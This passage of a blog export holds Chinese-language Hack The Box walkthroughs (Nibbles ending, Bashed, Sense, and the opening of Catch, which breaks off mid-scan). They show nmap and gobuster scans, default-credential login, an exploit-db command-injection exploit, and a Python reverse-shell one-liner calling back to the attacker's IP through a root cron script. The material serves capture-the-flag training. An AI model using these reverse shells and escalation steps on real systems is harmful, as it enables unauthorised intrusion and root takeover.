monitor.sh\n```\n写入语句后执行\n\n```bash\nsudo ./ monitor.sh\n```\n```bash\nroot@Nibbles:/home/nibbler/personal/stuff# whoami&&id\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n成功拿到 root 权限","tags":["Hackthebox"]},{"title":"Bashed - Hackthebox","url":"/2022/04/08/Hackthebox/Easy/Hackthebox-Bashed/","content":"\n# Hackthebox - Bashed\n# 靶场信息\n![](Hackthebox-Bashed/2d1d57ff-7137-4e2b-a021-cd676d088ebf.png)\n\n# 靶场类型\n![](Hackthebox-Bashed/bb16ca3f-9e06-4663-9e7b-744ea47889dc.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Bashed]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.68\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-07 20:51 EDT\nNmap scan report for 10.10.10.68\nHost is up (0.27s latency).\nNot shown: 65534 closed ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Arrexel's Development Site\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=4/7%OT=80%CT=1%CU=37395%PV=Y%DS=2%DC=T%G=Y%TM=624F8737\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=RD%II=I%TS=A)SEQ\nOS:(SP=F8%GCD=1%ISR=104%TI=Z%TS=A)SEQ(SP=101%GCD=1%ISR=107%TI=Z%II=I%TS=B)S\nOS:EQ(SP=F9%GCD=1%ISR=103%TI=Z%CI=RD%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7\nOS:%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=7120%W\nOS:2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M505NN\nOS:SNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y\nOS:%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR\nOS:%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40\nOS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G\nOS:%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 443/tcp)\nHOP RTT       ADDRESS\n1   229.69 ms 10.10.14.1\n2   229.83 ms 10.10.10.68\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 53.00 seconds\n```\n## Http\n![](Hackthebox-Bashed/4b0111f1-b9e8-4966-98c5-68d721e2f2f2.png)\n\n看着似乎像是一个博客，去随便看看\n\n![](Hackthebox-Bashed/a6074b6f-fc26-4a45-8575-02ea42a3700b.png)\n\n这里提示使用了 Arrexel 的 phpbash，然后给了一个地址\n\n/uploads/phpbash.php\n\n但是访问后不存在，去做个 fuzz 吧\n\n## Fuzz\n```bash\ngobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error\n\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.68\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/04/08 09:01:23 Starting gobuster in directory enumeration mode\n===============================================================\n/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]\n/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]\n/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]\n/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]\n/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]\n/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]\n/server-status        (Status: 403) [Size: 299]\n\n===============================================================\n2022/04/08 09:04:55 Finished\n===============================================================\n```\n![](Hackthebox-Bashed/5eb82d96-d315-4aca-a785-08e537d37edc.png)\n\n在 dev 下找到了我们要的东西\n\n# 漏洞利用\n![](Hackthebox-Bashed/61b2119e-3955-4e84-bbb6-680b01b30240.png)\n\n确认可以执行命令，那就来反弹一个 bashshell 吧\n\n使用 nc 监听一个端口\n\n```bash\nnc -nlvp 4444\n```\n然后下载一个 反向的 phpshell\n\n> [https://raw.githubusercontent.com/LucifielHack/TTY-Reverse-Shell-PHP/master/revshell.php](https://raw.githubusercontent.com/LucifielHack/TTY-Reverse-Shell-PHP/master/revshell.php)\n\n然后使用 python3 开启一个 http 服务器\n\n```bash\npython3 -m http.server 80\n```\n然后在 phpbash 里使用 wget 进行下载\n\n```bash\nwww-data@bashed:/var/www/html/uploads# wget http://10.10.14.9/revshell.php\n--2022-04-07 19:03:56-- http://10.10.14.9/revshell.php\nConnecting to 10.10.14.9:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 4479 (4.4K) [application/octet-stream]\nSaving to: 'revshell.php'\n\n0K .... 100% 443M=0s\n\n2022-04-07 19:03:56 (443 MB/s) - 'revshell.php' saved [4479/4479]\n```\n接着访问一下 revshell.php（需要在 uploads 目录下，否则没写入权限）\n\n```bash\ncurl http://10.10.10.68/uploads/revshell.php\n```\n```bash\n$ whoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n成功获得一个 shell\n\n```bash\n$ cat /home/arrexel/user.txt\n2c281f318555dbc1b856957c7147bfc1\n```\n成功获得 user 权限的 flag 文件\n\n# 权限提升\n```bash\n$ sudo -l\nMatching Defaults entries for www-data on bashed:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser www-data may run the following commands on bashed:\n    (scriptmanager : scriptmanager) NOPASSWD: ALL\n```\n使用 sudo -l 查看权限后，发现可以使用 scriptmanager 用户的权限指令任何命令\n\n```bash\npython3 -c \"import pty;pty.spawn('/bin/bash')\";\nCtrl+Z返回\nstty raw -echo; fg\nexport TERM=xterm\nstty rows 51 cols 237\n```\n首先获得一个交互式 bash，并且修复一下\n\n```bash\nsudo -u scriptmanager bash\n```\n然后使用 sudo -u 来使用 scriptmanager 用户执行 bash 指令\n\n```bash\nscriptmanager@bashed:/$ whoami\nwhoami\nscriptmanager\n```\n成功进入 scriptmanager 的 bash\n\n```bash\nscriptmanager@bashed:/$ ls\nls\nbin   etc         lib         media  proc  sbin     sys  var\nboot  home        lib64       mnt    root  scripts  tmp  vmlinuz\ndev   initrd.img  lost+found  opt    run   srv      usr\n```\n这里发现根目录下有一个不正常的 scripts 目录，进去查看一下\n\n```bash\nscriptmanager@bashed:/scripts$ ls -la\nls -la\ntotal 16\ndrwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .\ndrwxr-xr-x 23 root          root          4096 Dec  4  2017 ..\n-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py\n-rw-r--r--  1 root          root            12 Apr  7 19:21 test.txt\n```\n这里有两个文件，一个 test.py 我们可以运行，一个 test.txt 是 root 账户的文件，并且 test.txt 似乎最近刚被修改过\n\n```bash\nscriptmanager@bashed:/scripts$ cat test.txt\ncat test.txt\ntesting 123!\n```\n似乎没什么内容\n\n```bash\nscriptmanager@bashed:/scripts$ cat test.py\ncat test.py\nf = open(\"test.txt\", \"w\")\nf.write(\"testing 123!\")\nf.close\n```\n这个脚本会向 test.txt 写入内容，那就好办了，篡改一下内容\n\n```bash\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.9\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\n```\n然后使用 nc 监听一个端口\n\n```bash\nnc -nvlp 5555\n```\n接着等待一会儿\n\n```bash\n┌──(root💀lucifiel)-[/home/lucifiel/Desktop]\n└─# nc -nvlp 5555                                                                                                                                                                        130 ⨯\nlistening on [any] 5555 ...\nconnect to [10.10.14.9] from (UNKNOWN) [10.10.10.68] 35106\n/bin/sh: 0: can't access tty; job control turned off\n# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n成功拿到 root 权限\n\n```bash\n# cat /root/root.txt\ncc4f0afe3a1026d402ba10329674a8e2\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Sense- Hackthebox","url":"/2022/04/07/Hackthebox/Easy/Hackthebox-Sense/","content":"\n# Hackthebox - Sense\n# 靶场信息\n![](Hackthebox-Sense/7b55e2a0-8a6b-4396-abfe-a35f836f23bf.png)\n\n# 靶场类型\n![](Hackthebox-Sense/732171a8-afaf-4839-811a-d64164e9b802.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Sense]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.60\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-07 00:43 EDT\nNmap scan report for 10.10.10.60\nHost is up (0.30s latency).\nNot shown: 65533 filtered ports\nPORT    STATE SERVICE    VERSION\n80/tcp  open  http       lighttpd 1.4.35\n|_http-title: Did not follow redirect to https://10.10.10.60/\n443/tcp open  ssl/https?\n| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US\n| Not valid before: 2017-10-14T19:21:35\n|_Not valid after:  2023-04-06T19:21:35\n|_ssl-date: TLS randomness does not represent time\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: specialized|general purpose\nRunning (JUST GUESSING): Comau embedded (92%), FreeBSD 8.X (85%), OpenBSD 4.X (85%)\nOS CPE: cpe:/o:freebsd:freebsd:8.1 cpe:/o:openbsd:openbsd:4.3\nAggressive OS guesses: Comau C4G robot control unit (92%), FreeBSD 8.1 (85%), OpenBSD 4.3 (85%), OpenBSD 4.0 (85%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 443/tcp)\nHOP RTT       ADDRESS\n1   313.22 ms 10.10.14.1\n2   313.26 ms 10.10.10.60\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 65.91 seconds\n```\n## Http\n![](Hackthebox-Sense/86fc3ada-fba6-45ba-982e-03504c5f2dc6.png)\n\n是一台 pfsense，具体的版本不明\n\n测试了一下弱口令，没有成功\n\n去 fuzz 一下\n\n## fuzz\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Sense]\n└─# gobuster dir -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x txt -t 200\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     https://10.10.10.60\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              txt\n[+] Timeout:                 10s\n===============================================================\n2022/04/07 16:05:38 Starting gobuster in directory enumeration mode\n===============================================================\n/themes               (Status: 301) [Size: 0] [--> https://10.10.10.60/themes/]\n/css                  (Status: 301) [Size: 0] [--> https://10.10.10.60/css/]\n/includes             (Status: 301) [Size: 0] [--> https://10.10.10.60/includes/]\n/javascript           (Status: 301) [Size: 0] [--> https://10.10.10.60/javascript/]\n/changelog.txt        (Status: 200) [Size: 271]\n/classes              (Status: 301) [Size: 0] [--> https://10.10.10.60/classes/]\n/widgets              (Status: 301) [Size: 0] [--> https://10.10.10.60/widgets/]\n/tree                 (Status: 301) [Size: 0] [--> https://10.10.10.60/tree/]\n/shortcuts            (Status: 301) [Size: 0] [--> https://10.10.10.60/shortcuts/]\n/installer            (Status: 301) [Size: 0] [--> https://10.10.10.60/installer/]\n/wizards              (Status: 301) [Size: 0] [--> https://10.10.10.60/wizards/]\n/csrf                 (Status: 301) [Size: 0] [--> https://10.10.10.60/csrf/]\n/system-users.txt     (Status: 200) [Size: 106]\n/filebrowser          (Status: 301) [Size: 0] [--> https://10.10.10.60/filebrowser/]\n/%7Echeckout%7E       (Status: 403) [Size: 345]\n\n===============================================================\n2022/04/07 16:12:30 Finished\n===============================================================\n```\n这里看到有两个 txt 文件，去查看一下\n\n```bash\nhttps://10.10.10.60/changelog.txt\n\n# Security Changelog \n\n### Issue\nThere was a failure in updating the firewall. Manual patching is therefore required\n\n### Mitigated\n2 of 3 vulnerabilities have been patched.\n\n### Timeline\nThe remaining patches will be installed during the next maintenance window\n```\n```bash\nhttps://10.10.10.60/system-users.txt\n\n####Support ticket###\n\nPlease create the following user\n\nusername: Rohit\npassword: company defaults\n```\n第一个文件说发现了三个漏洞，已经修复了其中两个，那就是还有一个\n\n第二个文件告诉我们有一个账号 Rohit，密码是 pfSense的默认密码\n\n去搜索一下默认密码\n\n![](Hackthebox-Sense/4c1026cc-659b-43b5-96f6-2b15da3b7965.png)\n\n![](Hackthebox-Sense/1e571e0e-7ef9-4a7e-8ee2-071166c9b1c8.png)\n\n得到了一个账户密码\n\n```bash\nusername = rohit\npassword = pfsense\n```\n# 漏洞利用\n现在去登录\n\n![](Hackthebox-Sense/93f41927-92f2-4f4e-9399-30bdc5b8ab76.png)\n\n登入后可以看到，当前版本是 pfSense2.1.3\n\n去查找一下是否有漏洞\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Sense]\n└─# searchsploit pfSense2.1.3\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\npfSense< 2.1.4 - 'status_rrd_graph_img.php' Command Injection                                                                                                                    | php/webapps/43560.py\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\nPapers: No Results\n```\n还真找到一个\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Sense]\n└─# locate php/webapps/43560.py\n/usr/share/exploitdb/exploits/php/webapps/43560.py\n\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Sense]\n└─# cp /usr/share/exploitdb/exploits/php/webapps/43560.py ./exploit.py\n```\n把 exploit 给复制过来\n\n使用 nc 监听一个端口\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444                                      \nlistening on [any] 4444 ...\n```\n然后去执行 exploit\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444                                      \nlistening on [any] 4444 ...\nconnect to [10.10.14.9] from (UNKNOWN) [10.10.10.60] 65102\nsh: can't access tty; job control turned off\n# whoami&&id\nroot\nuid=0(root) gid=0(wheel) groups=0(wheel)\n```\n成功拿到 root 权限的 shell\n\n```bash\n# cat /home/rohit/user.txt\n8721327cc232073b40d27d9c17e7348b\n\n# cat /root/root.txt\nd08c32a5d4f8c8b10e76eb51a69f1a86\n```\n拿到 user 权限 和 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Catch - Hackthebox","url":"/2022/04/06/Hackthebox/Medium/Hackthebox-Catch/","content":"\n# Hackthebox - Catch\n# 靶场信息\n![](Hackthebox-Catch/65260f4c-a8f4-4590-98d3-0cf1c7499d25.png)\n\n# 靶场类型\n![](Hackthebox-Catch/1a78fc9e-7749-4dc0-be31-1e9428864b39.png)\n\n# 信息搜集\n## NMAP\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.150\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-06 03:34 EDT\nNmap scan report for 10.10.11.150\nHost is up (0.25s latency).\nNot shown: 65530 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)\n|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)\n|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-title: Catch Global Systems\n3000/tcp open  ppp?\n| fingerprint-strings: \n|   GenericLines, Help, RTSPRequest: \n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   GetRequest: \n|     HTTP/1.0 200 OK\n|     Content-Type: text/html; charset=UTF-8\n|     Set-Cookie: i_like_gitea=229c01ff2c679664; Path=/; HttpOnly\n|     Set-Cookie: _csrf=VFIu8a5yLSGnb8AWF33ofFOqRKE6MTY0OTIzMDUyNDYwMDczNjU5MQ; Path=/; Expires=Thu, 07 Apr 2022 07:35:24 GMT; HttpOnly; SameSite=Lax\n|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly\n|     X-Frame-Options: SAMEORIGIN\n|     Date: Wed, 06 Apr 2022 07:35:24 GMT\n|     <!DOCTYPE html>\n|     <html lang=\"en-US\" class=\"theme-\">\n|     <head data-suburl=\"\">\n|     <meta charset=\"utf-8\">\n|     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n|     <meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\">\n|     <title> Catch Repositories </title>\n|     <link rel=\"manifest\" href=\"data:application/json;base64,eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz\n|   HTTPOptions: \n|     HTTP/1.0 405 Method Not Allowed\n|     Set-Cookie: i_like_gitea=ada0631c19902f31; Path=/; HttpOnly\n|     Set-Cookie: _csrf=Fjvxg_M7Bc_5OS6o7uXWAaUEJCg6MTY0OTIzMDUzMzM1MTAzMTUxNg; Path=/; Expires=Thu, 07 Apr 2022 07:35:33 GMT; HttpOnly; SameSite=Lax\n|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly\n|     X-Frame-Options: SAMEORIGIN\n|     Date: Wed, 06 Apr 2022 07:35:33 GMT\n|_    Content-Length: 0\n5000/tcp open  upnp?\n| fingerprint-strings: \n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge: \n|     HTTP/1.1 400 Bad Request\n|     Connection: close\n|   GetRequest: \n|     HTTP/1.1 302 Found\n|     X-Frame-Options: SAMEORIGIN\n|     X-Download-Options: noopen\n|     X-Content-Type-Options: nosniff\n|     X-XSS-Protection: 1; mode=block\n|     Content-Security-Policy: \n|     X-Content-Security-Policy: \n|     X-WebKit-CSP: \n|     X-UA-Compatible: IE=Edge,chrome=1\n|     Location: /login\n|     Vary: Accept, Accept-Encoding\n|     Content-Type: text/plain; charset=utf-8\n|     Content-Length: 28\n|     Set-Cookie: connect.sid=s%3AEQngskGgO4I2xPH7SOxj7INNlQZTOA-7.bWQDiu%2BFXvDOHdHW15rgWh4N9jvQ7KAvrpzZQrh4Vvw; Path=/; HttpOnly\n|     Date: Wed, 06 Apr 2022 07:35:28 GMT\n|     Connection: close\n|     Found. Redirecting to /login\n|   HTTPOptions: \n|     HTTP/1.1 200 OK\n|     X-Frame-Options: SAMEORIGIN\n|     X-Download-Options: noopen\n|     X-Content-Type-Options: nosniff\n|     X-XSS-Protection: 1; mode=block\n|     Content-Security-Policy: \n|     X-Content-Security-Policy: \n|     X-WebKit-CSP: \n|     X-UA-Compatible: IE=Edge,chrome=1\n|     Allow: GET,HEAD\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 8\n|     ETag: W/\"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg\"\n|     Set-Cookie: connect.sid=s%3A-1OGMg8iZf45c1yBQ3QmeijWzg-5hyZy.5H0gXM7aorV%2BeFuutbDUJQn149ThPRcg%2FiKj%2FeVanl0; Path=/; HttpOnly\n|     Vary: Accept-Encoding\n|     Date: Wed, 06 Apr 2022 07:35:31 GMT\n|     Connection: close\n|_    GET,HEAD\n8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Catch Global Systems\n2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port3000-TCP:V=7.91%I=7%D=4/6%Time=624D42BB%P=x86_64-pc-linux-gnu%r(Gen\nSF:ericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20te\nSF:xt/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x2\nSF:0Request\")%r(GetRequest,14F9,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nContent-Type:\\x\nSF:20text/html;\\x20charset=UTF-8\\r\\nSet-Cookie:\\x20i_like_gitea=229c01ff2c\nSF:679664;\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csrf=VFIu8a5yLSGnb8AW\nSF:F33ofFOqRKE6MTY0OTIzMDUyNDYwMDczNjU5MQ;\\x20Path=/;\\x20Expires=Thu,\\x200\nSF:7\\x20Apr\\x202022\\x2007:35:24\\x20GMT;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nSe\nSF:t-Cookie:\\x20macaron_flash=;\\x20Path=/;\\x20Max-Age=0;\\x20HttpOnly\\r\\nX-\nSF:Frame-Options:\\x20SAMEORIGIN\\r\\nDate:\\x20Wed,\\x2006\\x20Apr\\x202022\\x200\nSF:7:35:24\\x20GMT\\r\\n\\r\\n<!DOCTYPE\\x20html>\\n<html\\x20lang=\\\"en-US\\\"\\x20cl\nSF:ass=\\\"theme-\\\">\\n<head\\x20data-suburl=\\\"\\\">\\n\\t<meta\\x20charset=\\\"utf-8\nSF:\\\">\\n\\t<meta\\x20name=\\\"viewport\\\"\\x20content=\\\"width=device-width,\\x20i\nSF:nitial-scale=1\\\">\\n\\t<meta\\x20http-equiv=\\\"x-ua-compatible\\\"\\x20content\nSF:=\\\"ie=edge\\\">\\n\\t<title>\\x20Catch\\x20Repositories\\x20</title>\\n\\t<link\\\nSF:x20rel=\\\"manifest\\\"\\x20href=\\\"data:application/json;base64,eyJuYW1lIjoi\nSF:Q2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyI\nSF:sInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3\nSF:sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz\")%r(Help,67,\"HTTP/1\\.1\\x2040\nSF:0\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\\nSF:nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\")%r(HTTPOptions,17F,\nSF:\"HTTP/1\\.0\\x20405\\x20Method\\x20Not\\x20Allowed\\r\\nSet-Cookie:\\x20i_like_\nSF:gitea=ada0631c19902f31;\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csrf=\nSF:Fjvxg_M7Bc_5OS6o7uXWAaUEJCg6MTY0OTIzMDUzMzM1MTAzMTUxNg;\\x20Path=/;\\x20E\nSF:xpires=Thu,\\x2007\\x20Apr\\x202022\\x2007:35:33\\x20GMT;\\x20HttpOnly;\\x20Sa\nSF:meSite=Lax\\r\\nSet-Cookie:\\x20macaron_flash=;\\x20Path=/;\\x20Max-Age=0;\\x\nSF:20HttpOnly\\r\\nX-Frame-Options:\\x20SAMEORIGIN\\r\\nDate:\\x20Wed,\\x2006\\x20\nSF:Apr\\x202022\\x2007:35:33\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(RTSP\nSF:Request,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text\nSF:/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20R\nSF:equest\");\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port5000-TCP:V=7.91%I=7%D=4/6%Time=624D42C0%P=x86_64-pc-linux-gnu%r(Get\nSF:Request,23C,\"HTTP/1\\.1\\x20302\\x20Found\\r\\nX-Frame-Options:\\x20SAMEORIGI\nSF:N\\r\\nX-Download-Options:\\x20noopen\\r\\nX-Content-Type-Options:\\x20nosnif\nSF:f\\r\\nX-XSS-Protection:\\x201;\\x20mode=block\\r\\nContent-Security-Policy:\\\nSF:x20\\r\\nX-Content-Security-Policy:\\x20\\r\\nX-WebKit-CSP:\\x20\\r\\nX-UA-Comp\nSF:atible:\\x20IE=Edge,chrome=1\\r\\nLocation:\\x20/login\\r\\nVary:\\x20Accept,\\\nSF:x20Accept-Encoding\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\n\nSF:Content-Length:\\x2028\\r\\nSet-Cookie:\\x20connect\\.sid=s%3AEQngskGgO4I2xP\nSF:H7SOxj7INNlQZTOA-7\\.bWQDiu%2BFXvDOHdHW15rgWh4N9jvQ7KAvrpzZQrh4Vvw;\\x20P\nSF:ath=/;\\x20HttpOnly\\r\\nDate:\\x20Wed,\\x2006\\x20Apr\\x202022\\x2007:35:28\\x2\nSF:0GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nFound\\.\\x20Redirecting\\x20to\\x20/lo\nSF:gin\")%r(RTSPRequest,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnectio\nSF:n:\\x20close\\r\\n\\r\\n\")%r(DNSVersionBindReqTCP,2F,\"HTTP/1\\.1\\x20400\\x20Ba\nSF:d\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(SMBProgNeg,2F,\"HTTP/1\\\nSF:.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(ZendJav\nSF:aBridge,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\\nSF:r\\n\\r\\n\")%r(HTTPOptions,247,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Frame-Options:\nSF:\\x20SAMEORIGIN\\r\\nX-Download-Options:\\x20noopen\\r\\nX-Content-Type-Optio\nSF:ns:\\x20nosniff\\r\\nX-XSS-Protection:\\x201;\\x20mode=block\\r\\nContent-Secu\nSF:rity-Policy:\\x20\\r\\nX-Content-Security-Policy:\\x20\\r\\nX-WebKit-CSP:\\x20\nSF:\\r\\nX-UA-Compatible:\\x20IE=Edge,chrome=1\\r\\nAllow:\\x20GET,HEAD\\r\\nConte\nSF:nt-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x208\\r\\nETag\nSF::\\x20W/\\\"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg\\\"\\r\\nSet-Cookie:\\x20connect\\.sid\nSF:=s%3A-1OGMg8iZf45c1yBQ3QmeijWzg-5hyZy\\.5H0gXM7aorV%2BeFuutbDUJQn149ThPR\nSF:cg%2FiKj%2FeVanl0;\\x20Path=/;\\x20HttpOnly\\r\\nVary:\\x20Accept-Encoding\\r\nSF:\\nDate:\\x20Wed,\\x2006\\x20Apr\\x202022\\x2007:35:31\\x20GMT\\r\\nConnection:\\\nSF:x20close\\r\\n\\r\\nGET,HEAD\")%r(RPCCheck,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Re\nSF:quest\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(DNSStatusRequestTCP,2F,\"HTTP/\nSF:1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(Help,\nSF:2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\"\nSF:);\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP 